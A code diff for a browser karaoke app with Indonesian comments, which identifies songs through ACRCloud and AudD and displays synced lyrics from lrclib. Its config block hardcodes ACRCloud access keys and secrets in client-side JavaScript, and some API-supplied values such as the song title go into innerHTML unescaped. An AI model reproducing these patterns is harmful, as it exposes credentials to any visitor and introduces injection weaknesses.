+          <button class="settings-toggle-pw" onclick="togglePw('settingsAcrSecret', this)">show</button>
+        </div>
+      </div>
+    </div>
+    <div class="settings-section">
+      <div class="settings-section-label">AudD (Fallback)</div>
+      <div class="settings-field">
+        <label>AudD API Token <span style="opacity:0.4">(optional)</span></label>
+        <div class="settings-row">
+          <input class="settings-input key-hidden" id="settingsAuddKey" placeholder="AudD API token" />
+          <button class="settings-toggle-pw" onclick="togglePw('settingsAuddKey', this)">show</button>
+        </div>
+      </div>
+    </div>
+    <div class="settings-section">
+      <div class="settings-section-label">Capture Duration</div>
+      <select class="settings-select" id="settingsCapture">
+        <option value="5000">5 detik — cepat</option>
+        <option value="7000" selected>7 detik — balance ✓</option>
+        <option value="10000">10 detik — akurat</option>
+        <option value="12000">12 detik — lagu sulit</option>
+      </select>
+    </div>
+    <button class="settings-save" onclick="saveSettings()">💾 Simpan Settings</button>
+    <div class="settings-hint" style="margin-top:8px;text-align:center">Keys disimpan di localStorage browser kamu.</div>
+  </div>
+</div>
+
 <div class="fullscreen-overlay" id="fullscreenOverlay">
   <div class="fs-song-info">
     <div class="fs-title" id="fsSongTitle">—</div>
@@ -332,13 +439,11 @@ body::after { content: ''; position: fixed; inset: 0; z-index: 0; background-ima
     <div class="fs-sub" id="fsSub"></div>
     <div class="fs-next" id="fsNext"></div>
   </div>
-  <div class="fs-wm">IRFAN ZAIN</div>
   <div class="fs-hint">ESC / tap to exit fullscreen</div>
   <div class="fs-progress"><div class="fs-progress-fill" id="fsProgressFill"></div></div>
 </div>
 
 <div class="app">
-  <!-- Header -->
   <div class="header">
     <div class="logo">
       <div class="logo-icon">♪</div>
@@ -349,10 +454,10 @@ body::after { content: ''; position: fixed; inset: 0; z-index: 0; background-ima
         <span class="status-dot" id="statusDot"></span>
         <span class="status-text" id="statusText">idle</span>
       </div>
+      <button class="settings-btn" onclick="openSettings()" title="API Key Settings">⚙</button>
     </div>
   </div>
 
-  <!-- Mic -->
   <div class="listen-section">
     <div class="mic-ring-outer">
       <button class="mic-btn" id="micBtn" onclick="toggleListen()">
@@ -379,11 +484,10 @@ body::after { content: ''; position: fixed; inset: 0; z-index: 0; background-ima
   <div class="spinner" id="spinner"></div>
   <div class="error-msg" id="errorMsg"></div>
 
-  <!-- Song card -->
   <div class="song-card" id="songCard">
     <div class="song-art" id="songArt">♪</div>
     <div class="song-meta">
-      <div class="song-title"  id="songTitle">—</div>
+      <div class="song-title" id="songTitle">—</div>
       <div class="song-artist" id="songArtist">—</div>
     </div>
     <div class="song-card-actions">
@@ -393,7 +497,16 @@ body::after { content: ''; position: fixed; inset: 0; z-index: 0; background-ima
     </div>
   </div>
 
-  <!-- Language strip -->
+  <div class="micadv-bar" id="micAdvBar">
+    <div class="micadv-dot"></div>
+    <span class="micadv-text">mic-advance aktif — lirik maju saat kamu diam antar baris</span>
+    <div class="micadv-sens">
+      <span class="micadv-sens-label">sens</span>
+      <input type="range" class="micadv-slider" id="micAdvSlider" min="1" max="10" value="7" oninput="updateMicAdvSens(this.value)">
+    </div>
+    <button class="micadv-next-btn" onclick="micAdvNext()">next ▶</button>
+  </div>
+
   <div class="lang-strip" id="langStrip">
     <span class="lang-label">lyrics:</span>
     <button class="lang-btn active" id="langOrig" onclick="setLang('original')">original</button>
@@ -402,15 +515,21 @@ body::after { content: ''; position: fixed; inset: 0; z-index: 0; background-ima
     <div class="translate-spinner" id="transSpinner"></div>
   </div>
 
-  <!-- Controls row -->
   <div class="offset-row" id="offsetRow">
     <button class="offset-btn" onclick="adjustOffset(-1)">−</button>
     <span class="offset-label" id="offsetLabel">offset -2s</span>
     <button class="offset-btn" onclick="adjustOffset(1)">+</button>
     <button class="scroll-toggle on" id="scrollToggle" onclick="toggleAutoScroll()">auto-scroll ✓</button>
+    <button class="resync-btn" id="forceResyncBtn" onclick="forceResync()" title="Re-identify sekarang">⟳ resync</button>
+    <span class="sync-warn-badge" id="syncWarnBadge" title="Identified via AudD — sync mungkin meleset. Pakai ← → untuk adjust.">⚠ adjust sync</span>
   </div>
 
-  <!-- Progress bar -->
+  <div class="font-size-row" id="fontSizeRow" style="display:none">
+    <span class="font-size-label">A−</span>
+    <input type="range" class="font-size-slider" id="fontSizeSlider" min="13" max="28" value="18" oninput="applyFontSize(this.value)">
+    <span class="font-size-label">A+</span>
+  </div>
+
   <div class="progress-wrap" id="progressWrap">
     <div class="progress-bar-bg"><div class="progress-bar-fill" id="progressFill"></div></div>
     <div class="progress-labels">
@@ -419,7 +538,6 @@ body::after { content: ''; position: fixed; inset: 0; z-index: 0; background-ima
     </div>
   </div>
 
-  <!-- Lyric stage -->
   <div class="lyric-stage" id="lyricStage">
     <div class="lyric-stage-label">lyrics</div>
     <div class="paused-badge" id="pausedBadge">paused</div>
@@ -433,17 +551,20 @@ body::after { content: ''; position: fixed; inset: 0; z-index: 0; background-ima
     <p>no synced lyrics found for this track.</p>
   </div>
 
-  <!-- Manual search -->
   <div class="manual-section">
     <div class="manual-label">or search manually</div>
+    <div class="settings-hint" style="font-size:10px;margin-bottom:6px">💡 Tips: Untuk lagu Indonesia, coba tanpa tanda kurung. Contoh: "Dewa 19" bukan "Dewa".</div>
     <div class="manual-row">
       <input class="manual-input" id="manualArtist" placeholder="artist" />
-      <input class="manual-input" id="manualTitle"  placeholder="song title" />
+      <input class="manual-input" id="manualTitle" placeholder="song title" />
       <button class="manual-btn" onclick="manualSearch()">go</button>
+    </div>
+    <div style="margin-top:8px">
+      <button class="paste-lyrics-btn" onclick="openPasteLyrics()">✎ paste lirik sendiri</button>
+      <span class="paste-lyrics-hint">untuk band yang liriknya gak ada di database</span>
     </div>
   </div>
 
-  <!-- Favorites -->
   <div class="favorites-section">
     <button class="favorites-toggle" onclick="toggleFavList()">♡ <span id="favToggleLabel">favorites</span></button>
     <div class="favorites-list" id="favoritesList">
@@ -456,18 +577,16 @@ body::after { content: ''; position: fixed; inset: 0; z-index: 0; background-ima
     </div>
   </div>
 
-  <!-- Keyboard hints -->
   <div class="keyboard-hint">
     <div class="key-item" onclick="togglePause()"><span class="key">space</span> pause</div>
     <div class="key-item" onclick="enterFullscreen()"><span class="key">F</span> fullscreen</div>
     <div class="key-item" onclick="adjustOffset(-1)"><span class="key">←</span> offset −</div>
     <div class="key-item" onclick="adjustOffset(1)"><span class="key">→</span> offset +</div>
     <div class="key-item" onclick="if(isListening && mediaStream) captureAndIdentify()"><span class="key">R</span> re-identify</div>
-    <div class="key-item" onclick="$('debugPanel').classList.toggle('visible')"><span class="key">D</span> debug</div>
+    <div class="key-item" onclick="document.getElementById('debugPanel').classList.toggle('visible')"><span class="key">D</span> debug</div>
     <div class="key-item no-action"><span class="key">tap lyric</span> jump to line</div>
   </div>
 
-  <!-- Debug panel -->
   <div class="debug-panel" id="debugPanel">
     <div class="debug-header">
       <span class="debug-title">debug log</span>
@@ -478,14 +597,36 @@ body::after { content: ''; position: fixed; inset: 0; z-index: 0; background-ima
 </div>
 
 <script>
+// ============================================================
+// LYRIC SYNC v26 — FINAL FIXES
+// Fixes:
+// 1. Manual search: mic-advance jalan setelah lirik muncul
+// 2. Auto-identify: lyrics muncul (bukan cuma judul/penyanyi)
+// 3. Word highlight gak macet (hapus throttle berlebihan)
+// 4. Race condition analyser → polling wait sampai ready
+// ============================================================
+
 /* ─── CONFIG ─── */
-const CFG = {
-  ACR_KEY    : 'd31da4f83df71b0b05f72fdde93cdbb9',
-  ACR_SECRET : 'suTpTNnI3mC7z0Ui19YuYnnNIWk5C7flxJBb5heS',
-  ACR_HOST   : 'identify-ap-southeast-1.acrcloud.com',
-  REID_SECS  : 5,
-  CAPTURE_MS : 5000,
+const CFG_DEFAULTS = {
+  ACR_KEY: '360cf9a0e7189c22283ca49b9d9d489c',
+  ACR_SECRET: 'ImzWZWFCC6Q3xIYbyWxmncltSulthRrMUuFPNfgY',
+  ACR_HOSTS: ['identify-ap-southeast-1.acrcloud.com', 'identify-eu-west-1.acrcloud.com', 'identify-us-west-2.acrcloud.com'],
+  AUDD_KEY: '',
+  REID_SECS: 20,
+  CAPTURE_MS: 5000,
 };
+let CFG = loadCFG();
+function loadCFG() {
+  const saved = JSON.parse(localStorage.getItem('lyricsync_cfg') || '{}');
+  return {
+    ACR_KEY: saved.ACR_KEY || CFG_DEFAULTS.ACR_KEY,
+    ACR_SECRET: saved.ACR_SECRET || CFG_DEFAULTS.ACR_SECRET,
+    ACR_HOSTS: CFG_DEFAULTS.ACR_HOSTS,
+    AUDD_KEY: saved.AUDD_KEY || CFG_DEFAULTS.AUDD_KEY,
+    REID_SECS: CFG_DEFAULTS.REID_SECS,
+    CAPTURE_MS: saved.CAPTURE_MS ? parseInt(saved.CAPTURE_MS) : CFG_DEFAULTS.CAPTURE_MS,
+  };
+}
 
 /* ── State ── */
 let mediaStream = null, isListening = false, isPaused = false;
@@ -498,15 +639,35 @@ let userScrolling = false, userScrollTimer = null, scrollListenerAttached = fals
 let audioCtx = null, analyser = null, vizAnimId = null;
 let currentLang = 'original';
 let translatedData = {};
+let auddIdentified = false;
 let favorites = JSON.parse(localStorage.getItem('karaokeV2_favs') || '[]');
+let lastWordHighlightTime = 0;
+
+/* wordMap */
+let wordMap = [];
+let lastActiveWordLine = -1;
+let wordHighlightEnabled = true;
+
+/* Mic-advance state */
+let micAdvMode = false;
+let plainLyricsTrackKey = '';
+let micAdvSens = 7;
+let micAdvLineCount = 0;
+let micAdvCurLine = -1;
+let isPastedLyrics = false;
+let _micAdvInterval = null;
+let _micWordInterval = null;
+let _lineStartTime = 0;
+let _lastVoiceTime = 0;
+let _hasVoiced = false;
 
 /* ── Helpers ── */
 const $ = id => document.getElementById(id);
 function dbg(msg, color) {
   const log = $('debugLog');
   if (!log) return;
-  const t = new Date().toLocaleTimeString('id', { hour:'2-digit', minute:'2-digit', second:'2-digit' });
-  log.innerHTML += `<div style="color:${color||'rgba(255,255,255,0.4)'}">[${t}] ${msg}</div>`;
+  const t = new Date().toLocaleTimeString('id', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+  log.innerHTML += `<div style="color:${color || 'rgba(255,255,255,0.4)'}">[${t}] ${msg}</div>`;
   log.scrollTop = log.scrollHeight;
 }
 function setStatus(cls, txt) {
@@ -523,38 +684,45 @@ function fmt(s) {
   return `${Math.floor(s / 60)}:${Math.floor(s % 60).toString().padStart(2, '0')}`;
 }
 function escHtml(s) {
-  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+}
+function normStr(s) {
+  return (s || '').toLowerCase().replace(/[^a-z0-9]/g, '');
 }
 
-/* ── Web Audio Visualizer ── */
+/* ── Visualizer ── */
 function startVisualizer(stream) {
+  // [v28] Buat AudioContext baru setelah user gesture — wajib untuk GitHub Pages
   if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+  // [v28] Resume jika suspended (terjadi di HTTPS/GitHub Pages saat idle/background tab)
+  if (audioCtx.state === 'suspended') audioCtx.resume();
   const src = audioCtx.createMediaStreamSource(stream);
   analyser = audioCtx.createAnalyser();
-  analyser.fftSize = 128;
+  analyser.fftSize = 2048;
   src.connect(analyser);
   const canvas = $('vizCanvas');
   const ctx = canvas.getContext('2d');
-  const buf = new Uint8Array(analyser.frequencyBinCount);
+  const freqBuf = new Uint8Array(analyser.frequencyBinCount);
+  const VIZ_BARS = 32;
   $('vizWrap').classList.add('visible');
   function draw() {
     vizAnimId = requestAnimationFrame(draw);
-    analyser.getByteFrequencyData(buf);
+    // [v28] Cek state AudioContext tiap frame — kalau suspended, resume dulu
+    if (audioCtx && audioCtx.state === 'suspended') { audioCtx.resume(); return; }
+    analyser.getByteFrequencyData(freqBuf);
     ctx.clearRect(0, 0, canvas.width, canvas.height);
     const accent = getComputedStyle(document.body).getPropertyValue('--accent').trim() || '#c8f135';
     const accent2 = getComputedStyle(document.body).getPropertyValue('--accent2').trim() || '#7b61ff';
-    const barW = (canvas.width / buf.length) * 2.5;
-    let x = 0;
-    for (let i = 0; i < buf.length; i++) {
-      const h = (buf[i] / 255) * canvas.height;
+    const barW = Math.floor(canvas.width / VIZ_BARS) - 1;
+    const step = Math.floor(freqBuf.length / VIZ_BARS);
+    for (let i = 0; i < VIZ_BARS; i++) {
+      const h = (freqBuf[i * step] / 255) * canvas.height;
+      const x = i * (barW + 1);
       const grad = ctx.createLinearGradient(0, canvas.height - h, 0, canvas.height);
       grad.addColorStop(0, accent);
       grad.addColorStop(1, accent2);
       ctx.fillStyle = grad;
-      ctx.beginPath();
-      ctx.roundRect(x, canvas.height - h, barW - 1, h, 2);
-      ctx.fill();
-      x += barW + 1;
+      ctx.fillRect(x, canvas.height - h, barW, h);
     }
   }
   draw();
@@ -563,21 +731,24 @@ function stopVisualizer() {
   if (vizAnimId) cancelAnimationFrame(vizAnimId);
   $('vizWrap').classList.remove('visible');
   const canvas = $('vizCanvas');
-  canvas.getContext('2d').clearRect(0, 0, canvas.width, canvas.height);
+  if (canvas) canvas.getContext('2d').clearRect(0, 0, canvas.width, canvas.height);
 }
 
-/* ── Auto-scroll / jump ── */
+/* ── Auto-scroll ── */
 function toggleAutoScroll() {
   autoScroll = !autoScroll;
   const btn = $('scrollToggle');
   btn.textContent = autoScroll ? 'auto-scroll ✓' : 'auto-scroll ✗';
-  btn.className   = 'scroll-toggle' + (autoScroll ? ' on' : '');
+  btn.className = 'scroll-toggle' + (autoScroll ? ' on' : '');
   if (autoScroll) jumpToCurrent();
 }
 function jumpToCurrent() {
   if (activeIdx < 0) return;
   const el = $('ll' + activeIdx), area = $('lyricScrollArea');
-  if (el && area) { area.scrollTop = el.offsetTop - area.clientHeight / 2 + el.offsetHeight / 2; $('jumpBtn').classList.remove('visible'); }
+  if (el && area) {
+    area.scrollTop = el.offsetTop - area.clientHeight / 2 + el.offsetHeight / 2;
+    $('jumpBtn').classList.remove('visible');
+  }
 }
 function attachScrollListener() {
   if (scrollListenerAttached) return;
@@ -586,7 +757,8 @@ function attachScrollListener() {
   scrollListenerAttached = true;
   area.addEventListener('scroll', () => {
     if (!autoScroll) return;
-    userScrolling = true; clearTimeout(userScrollTimer);
+    userScrolling = true;
+    clearTimeout(userScrollTimer);
     userScrollTimer = setTimeout(() => { userScrolling = false; }, 2500);
     if (activeIdx >= 0) {
       const el = $('ll' + activeIdx);
@@ -601,9 +773,20 @@ function attachScrollListener() {
 
 /* ── Mic ── */
 function toggleListen() { isListening ? stopListening() : startListening(); }
+// [v28] Resume AudioContext on any user interaction — wajib untuk GitHub Pages HTTPS policy
+function _resumeAudioCtx() {
+  if (audioCtx && audioCtx.state === 'suspended') {
+    audioCtx.resume().then(() => dbg('🔊 AudioContext resumed', '#c8f135'));
+  }
+}
+document.addEventListener('click', _resumeAudioCtx, { passive: true });
+document.addEventListener('touchstart', _resumeAudioCtx, { passive: true });
 async function startListening() {
   dbg('🎤 requesting mic...');
   try {
+    // [v28] Buat AudioContext sebelum getUserMedia — lebih konsisten di mobile/GitHub Pages
+    if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    if (audioCtx.state === 'suspended') await audioCtx.resume();
     mediaStream = await navigator.mediaDevices.getUserMedia({ audio: true });
     dbg('✅ mic granted', '#c8f135');
     isListening = true;
@@ -611,15 +794,21 @@ async function startListening() {
     $('listenHint').textContent = 'identifying...';
     setStatus('listening', 'listening');
     startVisualizer(mediaStream);
+    isPastedLyrics = false;
+    stopMicAdvMode();
     await captureAndIdentify();
-  } catch(e) {
+  } catch (e) {
     dbg('❌ mic error: ' + e.message, '#ff4f6d');
-    showError('Mic access denied. Allow microphone permission.');
+    showError('Mic access denied.');
   }
 }
 function stopListening() {
   isListening = false; isPaused = false; userScrolling = false;
   clearTimeout(userScrollTimer);
+  auddIdentified = false;
+  $('syncWarnBadge').classList.remove('visible');
+  $('autosyncToast').classList.remove('visible');
+  $('fontSizeRow').style.display = 'none';
   if (mediaStream) { mediaStream.getTracks().forEach(t => t.stop()); mediaStream = null; }
   $('micBtn').classList.remove('active');
   $('listenHint').textContent = 'tap to identify song';
@@ -631,15 +820,15 @@ function stopListening() {
   if (lyricTimer) clearInterval(lyricTimer);
   stopVisualizer();
   setStatus('', 'stopped');
+  if (micAdvMode) stopMicAdvMode();
 }
 
-/* ── Record + identify ── */
+/* ── Record & Identify ── */
 function getSupportedMimeType() {
-  const types = ['audio/webm;codecs=opus','audio/webm','audio/ogg;codecs=opus','audio/ogg','audio/mp4'];
-  for (const t of types) { if (MediaRecorder.isTypeSupported(t)) return t; }
+  const types = ['audio/webm;codecs=opus', 'audio/webm', 'audio/ogg;codecs=opus', 'audio/ogg', 'audio/mp4'];
+  for (const t of types) if (MediaRecorder.isTypeSupported(t)) return t;
   return '';
 }
-
 async function captureAndIdentify() {
   if (!mediaStream) return;
   dbg(`🔴 recording ${CFG.CAPTURE_MS / 1000}s...`);
@@ -647,476 +836,146 @@ async function captureAndIdentify() {
     const chunks = []; const t0 = Date.now();
     const mimeType = getSupportedMimeType();
     const rec = mimeType ? new MediaRecorder(mediaStream, { mimeType }) : new MediaRecorder(mediaStream);
-    const usedMime = rec.mimeType || mimeType || 'audio/webm';
-    dbg(`🎙 format: ${usedMime}`);
     rec.ondataavailable = e => { if (e.data && e.data.size > 0) chunks.push(e.data); };
     rec.onstop = async () => {
-      dbg('⏹ done, sending to ACR...');
-      await identifyWithACR(new Blob(chunks, { type: usedMime }), Date.now() - t0);
+      const captureMs = Date.now() - t0;
+      await runIdentify(new Blob(chunks, { type: rec.mimeType || mimeType || 'audio/webm' }), captureMs);
       resolve();
     };
     rec.start(100);
     setTimeout(() => { if (rec.state !== 'inactive') rec.stop(); }, CFG.CAPTURE_MS);
   });
 }
-
 async function identifyWithACR(blob, captureMs) {
-  try {
-    const ts = Math.floor(Date.now() / 1000);
-    const enc = new TextEncoder();
-    const ck = await crypto.subtle.importKey('raw', enc.encode(CFG.ACR_SECRET), { name: 'HMAC', hash: 'SHA-1' }, false, ['sign']);
-    const sig = await crypto.subtle.sign('HMAC', ck, enc.encode(`POST\n/v1/identify\n${CFG.ACR_KEY}\naudio\n1\n${ts}`));
-    const sigB64 = btoa(String.fromCharCode(...new Uint8Array(sig)));
-    const fd = new FormData();
-    fd.append('sample', blob, 'sample.wav');
-    fd.append('access_key', CFG.ACR_KEY);
-    fd.append('data_type', 'audio');
-    fd.append('signature_version', '1');
-    fd.append('signature', sigB64);
-    fd.append('timestamp', ts);
-    $('spinner').classList.add('visible');
-    const reqT0 = Date.now();
-    const res = await fetch(`https://${CFG.ACR_HOST}/v1/identify`, { method: 'POST', body: fd });
-    const data = await res.json();
-    const netMs = Date.now() - reqT0;
-    $('spinner').classList.remove('visible');
-    dbg(`📡 ACR: code=${data.status?.code} ${data.status?.msg}`, data.status?.code === 0 ? '#c8f135' : '#ff4f6d');
-
-    if (data.status?.code === 0 && data.metadata?.music?.length > 0) {
-      const track = data.metadata.music[0];
-      const title = track.title, artist = track.artists?.[0]?.name || 'Unknown';
-      const score = Math.round(track.score || 0);
-      const offsetSec = ((track.play_offset_ms || 0) + captureMs / 2 + netMs) / 1000;
-      const artUrl = track.album?.cover_url || null;
-      dbg(`🎵 ${title} — ${artist} (offset ${offsetSec.toFixed(1)}s)`, '#c8f135');
-      setStatus('found', 'identified');
-      $('songTitle').textContent = title;
-      $('songArtist').textContent = artist;
-      $('confBadge').textContent = score + '%';
-      const artEl = $('songArt');
-      if (artUrl) { artEl.innerHTML = `<img src="${artUrl}" alt="${title}" onerror="this.parentElement.textContent='♪'">`; } else { artEl.textContent = '♪'; }
-      $('songCard').classList.add('visible', 'playing');
-      $('listenHint').textContent = 'auto re-identifying...';
-      updateFavBtn();
-      $('fsSongTitle').textContent = title; $('fsSongArtist').textContent = artist;
-      const norm = s => s.toLowerCase().replace(/[^a-z0-9]/g, '');
-      const isNew = norm(title) !== norm(curTitle) || norm(artist) !== norm(curArtist);
-      curTitle = title; curArtist = artist;
-      if (isNew) {
-        manualOffset = -2; $('offsetLabel').textContent = 'offset -2s';
-        translatedData = {}; currentLang = 'original';
-        updateLangBtns();
-        const fetchStart = Date.now();
-        await fetchLyrics(artist, title, offsetSec, fetchStart);
-      } else {
-        resyncPosition(offsetSec); setStatus('found', 'synced');
-      }
-      startReidCountdown();
-    } else {
-      if (!curTitle) { setStatus('', 'not found'); showError('Could not identify. Try again or use manual search.'); $('listenHint').textContent = 'tap to try again'; }
-      else startReidCountdown();
-    }
-  } catch(e) {
-    $('spinner').classList.remove('visible');
-    dbg('❌ identify error: ' + e.message, '#ff4f6d');
-    showError('Network error. Check connection.');
-  }
-}
-
-/* ── Lyrics ── */
-function buildLyricQueries(artist, title) {
-  const queries = [];
-  queries.push({ artist, title });
-  const stripped = title
-    .replace(/\s*[\(\[【][^\)\]】]*[\)\]】]/g, '')
-    .replace(/\s*[-–]\s*(versi|version|ver\.?|cover|acoustic|live|remix|remaster|ost|feat\.?|ft\.?)[^\n]*/gi, '')
-    .replace(/\s+/g, ' ').trim();
-  if (stripped && stripped.toLowerCase() !== title.toLowerCase()) {
-    queries.push({ artist, title: stripped });
-  }
-  queries.push({ search: true, artist, title: stripped || title });
-  queries.push({ search: true, artist: '', title: stripped || title });
-  if (stripped !== title) queries.push({ search: true, artist: '', title });
-  return queries;
-}
-
-// Normalize string for comparison: lowercase, strip non-alphanumeric
-function normStr(s) {
-  return (s || '').toLowerCase().replace(/[^a-z0-9]/g, '');
-}
-
-// Score how well a lrclib result matches artist+title (higher = better)
-function matchScore(result, artist, title) {
-  const rArtist = normStr(result.artistName);
-  const rTitle  = normStr(result.trackName);
-  const qArtist = normStr(artist);
-  const qTitle  = normStr(title);
-
-  let score = 0;
-
-  // Title match (most important)
-  if (rTitle === qTitle) score += 100;
-  else if (rTitle.includes(qTitle) || qTitle.includes(rTitle)) score += 50;
-
-  // Artist match (critical — prevents wrong-artist bug)
-  if (qArtist && rArtist === qArtist) score += 80;
-  else if (qArtist && (rArtist.includes(qArtist) || qArtist.includes(rArtist))) score += 40;
-  else if (!qArtist) score += 20; // no artist filter, neutral
-
-  // Prefer synced lyrics
-  if (result.syncedLyrics) score += 30;
-  else if (result.plainLyrics) score += 10;
-
-  return score;
-}
-
-async function tryFetchLrclib(q) {
-  if (q.search) {
-    const params = new URLSearchParams({ q: `${q.artist ? q.artist + ' ' : ''}${q.title}`.trim() });
-    const res = await fetch(`https://lrclib.net/api/search?${params}`);
-    if (!res.ok) return null;
-    const arr = await res.json();
-    if (!Array.isArray(arr) || !arr.length) return null;
-
-    // Score all results and pick the best match
-    const scored = arr
-      .filter(x => x.syncedLyrics || x.plainLyrics)
-      .map(x => ({ result: x, score: matchScore(x, q.artist, q.title) }))
-      .sort((a, b) => b.score - a.score);
-
-    if (!scored.length) return null;
-
-    const best = scored[0];
-    dbg(`🎯 best match: "${best.result.artistName} — ${best.result.trackName}" (score: ${best.score})`,
-      best.score >= 150 ? '#c8f135' : best.score >= 80 ? '#ff9900' : '#ff4f6d');
-
-    // Warn if artist mismatch is likely
-    if (q.artist && normStr(best.result.artistName) !== normStr(q.artist) && best.score < 150) {
-      dbg(`⚠️ artist mismatch: got "${best.result.artistName}", expected "${q.artist}"`, '#ff9900');
-    }
-
-    return best.result;
-  } else {
-    const url = `https://lrclib.net/api/get?artist_name=${encodeURIComponent(q.artist)}&track_name=${encodeURIComponent(q.title)}`;
-    const res = await fetch(url);
-    if (res.status === 404 || !res.ok) return null;
-    return await res.json();
-  }
-}
-
-async function fetchLyrics(artist, title, offsetSec, fetchStart = Date.now()) {
-  $('noLyrics').classList.remove('visible');
-  $('lyricStage').classList.remove('visible');
-  $('progressWrap').classList.remove('visible');
-  $('offsetRow').classList.remove('visible');
-  $('langStrip').classList.remove('visible');
-  $('jumpBtn').classList.remove('visible');
-  if (lyricTimer) clearInterval(lyricTimer);
-  lyricData = []; activeIdx = -1; scrollListenerAttached = false;
-
-  setStatus('found', 'fetching lyrics');
-  const queries = buildLyricQueries(artist, title);
-  let data = null;
-
-  for (const q of queries) {
-    const label = q.search
-      ? `🔍 search: "${q.artist ? q.artist+' – ' : ''}${q.title}"`
-      : `📝 get: ${q.artist} — ${q.title}`;
-    dbg(label);
+  for (const host of CFG.ACR_HOSTS) {
     try {
-      const result = await tryFetchLrclib(q);
-      if (result && (result.syncedLyrics || result.plainLyrics)) {
-        // Reject if artist clearly doesn't match (score too low on artist-specific queries)
-        const score = matchScore(result, artist, title);
-        const artistMismatch = q.artist && normStr(result.artistName) &&
-          !normStr(result.artistName).includes(normStr(artist)) &&
-          !normStr(artist).includes(normStr(result.artistName));
-
-        if (artistMismatch && score < 100) {
-          dbg(`❌ skip: artist mismatch "${result.artistName}" ≠ "${artist}"`, '#ff4f6d');
-          continue;
-        }
-
-        data = result;
-        dbg(`✅ accepted: "${result.artistName} — ${result.trackName}" (score: ${score})`, '#c8f135');
-        break;
-      }
-    } catch(e) {
-      dbg(`⚠️ query failed: ${e.message}`, '#ff4f6d');
-    }
+      const ts = Math.floor(Date.now() / 1000);
+      const enc = new TextEncoder();
+      const ck = await crypto.subtle.importKey('raw', enc.encode(CFG.ACR_SECRET), { name: 'HMAC', hash: 'SHA-1' }, false, ['sign']);
+      const sig = await crypto.subtle.sign('HMAC', ck, enc.encode(`POST\n/v1/identify\n${CFG.ACR_KEY}\naudio\n1\n${ts}`));
+      const sigB64 = btoa(String.fromCharCode(...new Uint8Array(sig)));
+      const fd = new FormData();
+      fd.append('sample', blob, 'sample.wav');
+      fd.append('sample_bytes', blob.size);
+      fd.append('access_key', CFG.ACR_KEY);
+      fd.append('data_type', 'audio');
+      fd.append('signature_version', '1');
+      fd.append('signature', sigB64);
+      fd.append('timestamp', ts);
+      const controller = new AbortController();
+      const timeout = setTimeout(() => controller.abort(), 12000);
+      const res = await fetch(`https://${host}/v1/identify`, { method: 'POST', body: fd, signal: controller.signal });
+      clearTimeout(timeout);
+      const data = await res.json();
+      if (data.status?.code === 0 && data.metadata?.music?.length > 0) return data;
+    } catch (e) { dbg(`ACR ${host} error: ${e.message}`, '#ff4f6d'); }
   }
-
-  if (!data) {
-    $('noLyrics').classList.add('visible');
-    setStatus('found', 'no lyrics');
-    dbg('❌ no lyrics found after all attempts', '#ff4f6d');
-    return;
-  }
-
-  dbg(`📝 lyrics: ${data.syncedLyrics ? 'synced ✓' : 'plain only'}`, data.syncedLyrics ? '#c8f135' : '#ff9900');
-  if (data.syncedLyrics) {
-    parseLRC(data.syncedLyrics, data.duration || 0);
-    buildLyricDOM();
-    const fetchElapsed = (Date.now() - fetchStart) / 1000;
-    dbg(`⏱ fetch lirik: ${fetchElapsed.toFixed(2)}s, total offset: ${(offsetSec + fetchElapsed).toFixed(2)}s`, '#7b61ff');
-    startKaraoke(offsetSec + fetchElapsed);
-    setStatus('found', 'playing');
-    $('offsetRow').classList.add('visible');
-    $('langStrip').classList.add('visible');
-  } else if (data.plainLyrics) {
-    showPlainLyrics(data.plainLyrics);
-    setStatus('found', 'lyrics (no sync)');
-  } else {
-    $('noLyrics').classList.add('visible');
-    setStatus('found', 'no lyrics');
-  }
+  return null;
 }
-
-function parseLRC(lrc, dur) {
-  lyricData = []; totalDuration = dur;
-  const re = /\[(\d{2}):(\d{2})\.(\d{2,3})\](.*)/;
-  lrc.split('\n').forEach(line => {
-    const m = line.match(re);
-    if (m) {
-      const t = +m[1] * 60 + +m[2] + +m[3].padEnd(3, '0') / 1000;
-      const txt = m[4].trim();
-      if (txt) lyricData.push({ time: t, text: txt, offset: 0 });
-    }
-  });
-}
-
-function buildLyricDOM() {
-  $('lyricLines').innerHTML = lyricData.map((l, i) => {
-    const sub = getSubLine(i);
-    return `<div class="lyric-line" id="ll${i}" onclick="clickLine(${i})" title="Click to sync here">
-      ${escHtml(l.text)}${sub ? `<span class="lyric-sub" id="lls${i}">${escHtml(sub)}</span>` : ''}
-    </div>`;
-  }).join('');
-  $('lyricStage').classList.add('visible');
-  $('progressWrap').classList.add('visible');
-  // Scroll halaman ke lyricStage setelah lirik muncul
-  setTimeout(() => {
-    $('lyricStage').scrollIntoView({ behavior: 'smooth', block: 'start' });
-  }, 100);
-  if (totalDuration > 0) $('timeDuration').textContent = fmt(totalDuration);
-  attachScrollListener();
-}
-
-function getSubLine(i) {
-  if (currentLang === 'romanized' && translatedData.romanized?.[i]) return translatedData.romanized[i];
-  if (currentLang === 'translated' && translatedData.translated?.[i]) return translatedData.translated[i];
-  return '';
-}
-
-function clickLine(i) {
-  if (!lyricData[i]) return;
-  const lineTime = lyricData[i].time + lyricData[i].offset;
-  startTime = Date.now() - (lineTime + manualOffset) * 1000;
-  if (isPaused) { pausedAt = Date.now(); startTime = Date.now() - lineTime * 1000; }
-  activeIdx = -1;
-  tick();
-  dbg(`↪ jumped to line ${i}: "${lyricData[i].text.slice(0,30)}"`, '#7b61ff');
-}
-
-function startKaraoke(offsetSec) {
-  startTime = Date.now() - (offsetSec + manualOffset) * 1000;
-  if (lyricTimer) clearInterval(lyricTimer);
-  isPaused = false;
-  $('lyricStage').classList.remove('paused');
-  $('pausedBadge').classList.remove('visible');
-  lyricTimer = setInterval(tick, 80);
-  tick();
-}
-
-function resyncPosition(offsetSec) {
-  if (!lyricData.length) return;
-  if (!isPaused) startTime = Date.now() - (offsetSec + manualOffset) * 1000;
-  tick();
-}
-
-function tick() {
-  if (!startTime || isPaused) return;
-  const elapsed = (Date.now() - startTime) / 1000;
-  $('timeElapsed').textContent = fmt(elapsed);
-  if (totalDuration > 0) {
-    const pct = Math.min(100, elapsed / totalDuration * 100);
-    $('progressFill').style.width = pct + '%';
-    $('fsProgressFill').style.width = pct + '%';
